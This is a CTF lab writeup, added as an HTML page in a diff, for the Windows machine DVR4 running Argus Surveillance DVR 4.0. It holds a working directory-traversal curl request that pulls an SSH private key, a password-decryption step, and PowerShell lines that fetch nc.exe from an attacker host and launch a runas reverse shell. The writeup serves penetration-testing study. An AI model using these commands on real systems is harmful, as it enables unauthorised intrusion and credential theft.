@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVR4 &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>DVR4</h1>
+    <div class="meta">Target: <code>192.168.180.179</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">DirectoryTraversal</span><span class="tag">CVE-2018-15745</span><span class="tag">WeakEncryption</span><span class="tag">CVE-2022-25012</span><span class="tag">SSH</span><span class="tag">runas</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#directory-traversal-to-ssh-key-cve-2018-15745">Directory Traversal to SSH Key (CVE-2018-15745)</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#weak-password-encryption-cve-2022-25012">Weak Password Encryption (CVE-2022-25012)</a><a class="lvl3" href="#runas-to-administrator">runas to Administrator</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>DVR4 is a Windows machine running Argus Surveillance DVR 4.0, which is vulnerable to two separate CVEs. A directory traversal (CVE-2018-15745) leaks an SSH private key for initial access, and a weak password encryption flaw (CVE-2022-25012) decrypts administrator credentials stored in the application's config file. With cleartext admin credentials in hand, <code>runas</code> spawns a reverse shell as Administrator without ever touching a traditional exploit.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE            VERSION
+22/tcp   open  ssh
+8080/tcp open  http
+3389/tcp open  ms-wbt-server
+</code></pre>
+<p>Port 8080 serves the Argus DVR web interface. An <code>/about.php</code> page confirms the exact version:</p>
+<pre><code>Argus Surveillance DVR
+Version: 4.0
+Released 18/12/2008
+</code></pre>
+<p>Searchsploit returns two hits for this version:
+- <strong>CVE-2018-15745</strong>, Directory Traversal (EDB-45296)
+- <strong>CVE-2022-25012</strong>, Weak Password Encryption (EDB-50130)</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="directory-traversal-to-ssh-key-cve-2018-15745">Directory Traversal to SSH Key (CVE-2018-15745)</h3>
+<p>The DVR control panel shows a user named <code>viewer</code>. The traversal vulnerability allows reading arbitrary files from the system by encoding <code>../</code> sequences in a <code>RESULTPAGE</code> parameter. Targeting the SSH private key directly:</p>
+<pre><code class="language-sh">curl &quot;http://192.168.180.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&amp;RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&amp;USEREDIRECT=1&amp;WEBACCOUNTID=&amp;WEBACCOUNTPASSWORD=&quot;
+</code></pre>
+<p>The response returns <code>viewer</code>'s full RSA private key.</p>
+<blockquote>
+<p><strong>Why traversal gives SSH keys:</strong> the DVR web process runs with enough filesystem access to serve files outside its web root. The <code>RESULTPAGE</code> parameter was designed to redirect to application pages, but without sanitization it accepts absolute paths encoded as traversal sequences. The attacker specifies the path, the server reads it, and the response body contains the file contents.</p>
+</blockquote>
+<p>Using the recovered key:</p>
+<pre><code class="language-sh">ssh -i id_rsa viewer@192.168.180.179
+Microsoft Windows [Version 10.0.19044.1645]
+
+C:\Users\viewer&gt; whoami
+dvr4\viewer
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-powershell">C:\Users\viewer\Desktop&gt; type local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="weak-password-encryption-cve-2022-25012">Weak Password Encryption (CVE-2022-25012)</h3>
+<p>The Argus DVR stores application passwords in <code>C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini</code>. As <code>viewer</code>, this file is readable. It contains two hashed admin passwords:</p>
+<pre><code>‹redacted›
+</code></pre>
+<p>EDB-50130 decrypts Argus's proprietary cipher, which operates on two-byte blocks. The original script fails on special characters; the updated version from GitHub (CVE-2022-25012) handles the full character set:</p>
+<pre><code class="language-sh">python3 arg.py ‹redacted›
+[+] Password: ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why this encryption is "weak":</strong> Argus uses a static lookup table keyed on two-byte hex chunks. There's no salt, no iteration count, and the mapping is fixed, the same plaintext always produces the same ciphertext. Any attacker with the INI file and the lookup table (published in the CVE PoC) can reverse every password in seconds. It's not encryption in any security-meaningful sense; it's obfuscation with a published key.</p>
+</blockquote>
+<h3 id="runas-to-administrator">runas to Administrator</h3>
+<p>With the administrator plaintext password, <code>runas</code> executes any command as Administrator without needing an interactive logon. Transferring nc.exe and using <code>runas</code> to spawn a reverse shell:</p>
+<pre><code class="language-powershell">iwr -uri http://192.168.45.244/nc.exe -OutFile nc.exe
+runas /user:administrator &quot;.\nc.exe -e cmd.exe 192.168.45.244 443&quot;
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [...] from (UNKNOWN) [192.168.180.179] 50400
+
+C:\WINDOWS\system32&gt; whoami
+dvr4\administrator
+</code></pre>
+<pre><code class="language-powershell">C:\Users\Administrator\Desktop&gt; type proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Enumerate application users from the UI before exploiting.</strong> The control panel revealed the <code>viewer</code> username, which made the traversal path precise rather than a blind guess.</li>
+<li><strong>Two CVEs for the same product, two different primitives.</strong> The traversal gave initial access; the weak encryption gave privilege. Check searchsploit for every version string you find, one product can have multiple useful bugs.</li>
+<li><strong><code>runas</code> is a clean privesc when you have plaintext creds.</strong> No exploit needed, no AV trigger, no new process injection. The OS itself runs the payload as the target user.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
